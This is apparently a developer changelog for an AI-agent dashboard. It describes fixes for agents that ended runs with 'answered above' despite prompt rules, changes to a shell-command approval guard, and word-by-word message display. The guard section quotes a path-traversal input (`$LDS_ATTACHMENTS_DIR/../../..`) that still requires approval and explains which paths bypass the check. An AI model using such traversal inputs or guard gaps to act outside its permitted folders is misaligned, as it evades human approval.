An agent wrote its deliverable as a message in the middle of the run and ended with a short «ready, see above». The run's text messages (`assistant` events) were streamed live but, outside debug mode, NOT stored — only the final result was. After a reload (or in a chat / the task page opened later) the person saw only «ready, see above». Now an agent's text messages are stored like the final answer (tool calls, thinking and system lines still only in debug mode), and SOUL.md says the final message must carry the deliverable itself, never «see above». Existing tasks lost those messages for good.

## «Document ready» with no content — the charter itself asked for it (fixed)
After 0.1.102 an agent still ended with «the document is ready» and the list lived only in a saved file. Cause: SOUL.md told agents to «refer to a file, do not repeat it» and `workspace_save` «lists it as an attachment — no copy», which the agent applied to the very document the person asked to read; and the dashboard could not open such a file in the page (Markdown / html were only downloads). Now: SOUL.md says a document the person asked for is answered IN the final message (up to ~6,000 characters; longer — every item in brief plus the file name), the «refer, do not repeat» rule is limited to pictures / videos / files already shown; and attachments of type md / html / csv / json / txt / pdf open in a viewer in the page (`DocViewer`: Markdown rendered, html sandboxed without scripts, csv as a table). A document saved with `workspace_save` is also posted into the conversation as a chip that opens the viewer (before, only pictures were). Not a code guarantee for the content — the agent can still disobey; if it recurs, the next step is to attach the file's text to the final message automatically.

## The answer stayed in an earlier message, the last one said «answered above» (fixed in code, not only in the prompt)
Seen on a PM agent: the letter and the list of services were written as a message, then the run ended with «Ответил выше. Изменений в коде нет.» — and a chat channel / the «messages only» view shows the last message. The agent then re-sent the same list three times (money wasted). The charter rule alone did not hold (the model breaks it). Now the server enforces it: when the final message is short (< 240 characters) and the run's last long message (≥ 400 characters, no real work after it — only reporting / saving / showing tools) is not in it, that message is put in front of the closing line; the dashboard hides the earlier copy so the text is not shown twice. Also noted, not changed: the closing «no code changes» on a question that has nothing to do with code is the agent's habit (a shipped template can be tuned; the user's own `pm.md` was not touched).

## Cards in No-approvals mode for `$LDS_ATTACHMENTS_DIR/…` and `rm -rf` of it (fixed)
A scheduled agent (chart → PNG → send → clean up) got a card on 11 of its runs although the project asks nothing: the shell guard treats a path it cannot know (`$VAR/…`) as «outside the working directory», and the task's attachments folder was not one of the agent's write roots at all. `/tmp` itself was already free (SCRATCH_ROOTS). Now: the task's attachments folder is a write root; `$LDS_ATTACHMENTS_DIR` and `$TMPDIR` (values passed by the hook / read from the agent's environment, only those two, only plain absolute paths) are substituted before the command is judged, so `cp x $LDS_ATTACHMENTS_DIR/`, `rm -rf $LDS_ATTACHMENTS_DIR/old`, `mkdir $TMPDIR/b` are routine and `$LDS_ATTACHMENTS_DIR/../../..` or an unknown `$HOME/x` are still asked about. Other variables (`$D` from `mktemp -d`) remain «unknown» → a card; use a literal `/tmp/name` path in such scripts.

## UX: a new agent message appears smoothly, word by word (changed)
New messages used to appear all at once, which is hard to follow. A message that arrives while the chat is open is now revealed by words: ~30 words/s, a long message speeds up so none takes over 3 s; the first word shows at once; the chat keeps following the bottom unless the person scrolled up; a click shows the rest; not for short messages (< 40 characters), history loaded on opening, a hidden tab or the «reduce motion» system setting; a message already shown does not replay when the view is re-rendered, and a final answer that begins with a text already read continues after it instead of replaying. Sound, read-aloud and copy use the full text.
